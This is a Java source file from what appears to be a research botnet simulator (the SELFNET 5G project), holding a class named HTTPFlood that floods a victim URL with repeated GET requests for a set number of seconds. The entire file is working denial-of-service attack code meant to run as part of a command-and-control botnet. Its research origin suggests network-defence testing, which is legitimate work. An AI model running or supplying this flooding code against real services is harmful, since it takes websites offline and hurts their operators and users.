/**
	ZombieBot: Real or cloned zombie to recruit into a C&C Server making up a given botnet.
	Copyright (C) 2018 SELFNET H2020 Project <http://selfnet-5g.eu>

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

package selfnet.attack;

import java.net.HttpURLConnection;
import java.net.URL;

public class HTTPFlood extends Thread {
	private String url;
	private int duration;

	private boolean verbose;

	public HTTPFlood(String url, int duration, boolean verbose) {
		this.url = url;
		this.duration = duration;

		this.verbose = verbose;

		start();
	}

	public void run() {
		long currentTime = System.currentTimeMillis();
		long endTime = currentTime + (duration * 1000);

		if (verbose)
			System.out.println("Executing HTTP Flood attack (ID: " + this.getId() + ") - Victim = " + url + ", Duration = " + duration + " seconds");

		while (System.currentTimeMillis() < endTime) {
			try {
				HttpURLConnection.setFollowRedirects(false);

				// Start the HTTP flood attack
				HttpURLConnection httpConnection = (HttpURLConnection) (new URL("http://" + url)).openConnection();
				httpConnection.setRequestMethod("GET");
				httpConnection.getResponseCode();

				httpConnection = null;
			} catch (Exception excp) {
				; // Do nothing
			}
		}

		if (verbose)
			System.out.println("HTTP Flood attack finished (ID: " + this.getId() + ")");
	}
}
